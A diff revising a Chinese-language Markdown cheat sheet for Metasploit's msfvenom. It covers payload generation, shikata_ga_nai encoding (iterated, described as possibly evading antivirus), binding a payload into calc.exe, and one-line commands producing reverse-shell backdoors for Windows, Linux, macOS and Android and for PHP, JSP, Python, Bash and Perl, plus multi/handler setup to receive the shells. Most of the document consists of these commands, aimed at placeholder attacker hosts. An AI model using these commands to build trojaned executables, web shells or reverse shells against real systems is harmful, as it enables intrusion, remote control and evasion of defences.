@@ -95,8 +95,9 @@ Msfvenom –p windows/meterpreter/reverse_tcp –platform windows –a x86 –x 
 
 生成payload至少需指定-p 和 -f
 
-除了自带的那些payload外
-`-p -`可指定自定义的payload ，如：
+1.指定msfvenom自带的payload名称  `–p windows/meterpreter/reverse_tcp`
+
+2.指定自定义的payload `-p -` 如：
 
 ```
 cat payload_file.bin | msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw
@@ -132,11 +133,11 @@ Transform formats
 ```
 
 
-### -a x64
+### -a [指定架构architecture]
 
--a x86
+`-a x86`
 
--a x86_64
+`-a x86_64`
 
 ```
 msfvenom -p windows/meterpreter/bind_tcp --help-platform
@@ -146,7 +147,7 @@ Platforms
 ```
 
 	
--a不指定也可以，可在-p后的payload名称中明确指定architecture，如：
+除了使用-a参数指定架构，还可以在-p后的payload名称中直接明确指定架构，如：
 
 ```
 msfvenom -p linux/x86/exec CMD=/bin/sh
@@ -160,9 +161,11 @@ msfvenom -p linux/x86/exec CMD=/bin/sh
 
 ### 对payload进行编码
 
-1.规避特殊字符  -b '/x00一个特殊字符列表'
+1.规避特殊字符  
 
-msf会自动找一个合适的编码器规避payload中的这些“坏字符”:
+`-b '/x00一个特殊字符列表'`
+
+msf会自动找一个合适的编码器规避payload中的这些"坏字符"
 `msfvenom -p windows/meterpreter/bind_tcp -b '\x00' -f raw`
 
 ```
@@ -170,29 +173,37 @@ Found 10 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
 ```
 
-不同的函数，有不同的规避字符：
-如gets就需要避免`/x0a`
-如scanf更严格，不允许空白符
+
+* 不同的函数，有不同的规避字符
+  * gets函数 需要避免`/x0a`
+  * scanf函数 更严格，不允许空白符
+  * ...
+
 如产生一段exec的shellcode
 
-2.用-e选项指定编码器encoder，如：
+2.编码
 
+指定编码器 `-e encoderName`
+
+如
 ```
-msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw
+msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw -o test.bin
 ```
 
-默认的输出格式是raw，直接输出payload的字符（含乱码），常加参数-o写到文件中。
+默认的输出格式是raw(直接输出payload的字符 含乱码)
 
 
-3.使用-i选项进行多次编码
-迭代编码也许会有规避杀毒软件的作用，但这不是真正的免杀。
+3.迭代编码
 
-迭代编码 例子：
-`msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3`
+使用-i选项进行迭代编码(迭代编码也许会有规避杀毒软件的作用)
+
+如 3次迭代编码
+```
+msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
+```
 
 
 msf中所有的编码器：
-
 ```
 msfvenom -l encoders
 
@@ -244,19 +255,18 @@ Framework Encoders
 ```
 
 
-### -x 指定一个模板文件（“捆绑“payload到这个正常的可执行文件）
+### -x 指定一个模板文件（将payload附加"捆绑"到某个正常的模版文件）
 
-msfvenom使用的模板文件保存在目录`msf/data/templates`
+捆绑payload到 模板文件（即 宿主文件， 即 自定义的可执行文件）
 
--x calc.exe
-捆绑payload到 正常文件（模板文件=宿主文件=自定义的可执行文件）
-
-使用-x选项指定你自己的模板文件（如exe等），如：
-使用windows下的calc.exe作为模板文件,生成payload：
-
+如 使用windows下的calc.exe作为模板文件,生成payload：
 ```
 msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe
 ```
+
+msfvenom使用的模板文件保存在目录`msf/data/templates`
+
+
 
 注意，在win x64下使用自定义的x64的模板文件（如exe等）创建x64的payload时，输出格式必须要写`-f exe-only`而不能写`-f exe`
 （Please note: If you'd like to create a x64 payload with a custom x64 custom template for Windows, then instead of the exe format, you should use exe-only:）
@@ -280,6 +290,7 @@ msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.
 
 
 ### 编译生成的C文件
+
 ```bash
 #win x86生成c文件
 msfvenom -p windows/meterpreter/reverse_tcp lhost=[AttackerIP] lport=4444 -f c -e x86/shikata_ga_nai -i 12 -b '\x00'
@@ -313,9 +324,12 @@ main()
 
 ### 生成典型payload：各系统下的反向连接后门
 
-reverse_tcp 支持以下平台：
+reverse_tcp 支持以下平台
+
 Platform: Android, BSD, Java, JavaScript, Linux, OSX, NodeJS, PHP, Python, Ruby, Solaris, Unix, Windows, Mainframe, Multi
 
+
+操作系统
 ```
 #win x86
 msfvenom -p windows/meterpreter/reverse_tcp lhost=[AttackerIP] lport=4444 -f exe -o /tmp/my_payload.exe
@@ -334,8 +348,8 @@ msfvenom -p osx/x64/shell_reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f
 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=4444 R > androvirus.apk
 ```
 
-Web
 
+Web语言
 ```
 #PHP
 msfvenom -p php/meterpreter_reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f raw > shell.php
@@ -351,8 +365,8 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f war > shell.war
 ```
 
-脚本
 
+脚本语言
 ```
 #Python
 msfvenom -p cmd/unix/reverse_python LHOST=[AttackerIP] LPORT=[AttackerPort]  -f raw > shell.py
@@ -362,10 +376,13 @@ msfvenom -p cmd/unix/reverse_bash LHOST=[AttackerIP]  LPORT=[AttackerPort]  -f r
 msfvenom -p cmd/unix/reverse_perl LHOST=[AttackerIP] LPORT=[AttackerPort] -f raw > shell.pl
 ```
 
-### msfconsole监听并接受连入的shell 创建session
 
-**Handlers说明**
-ijup Metasploit to be in a position to receive your incoming shells. 
+### msf开启监听
+
+攻击机启动Handlers以开启AttackerLocalIP:Port监听，等待反弹shell
+
+**Handlers**
+Metasploit to be in a position to receive your incoming shells. 
 Handlers should be in the following format.
 
 
@@ -376,9 +393,11 @@ use exploit/multi/handler
 show options
 set payload windows/x64/meterpreter/reverse_tcp
 show options
-set LHOST [AttackerIP]
+set LHOST [AttackerLocalIP]
 #默认4444端口
-set LPORT [AttackerPort]
+set LPORT [AttackerLocalPort]
 set ExitOnSession false
 exploit -j -z
 ```
+
+接收到反弹的shell则创建一个session，便于后渗透
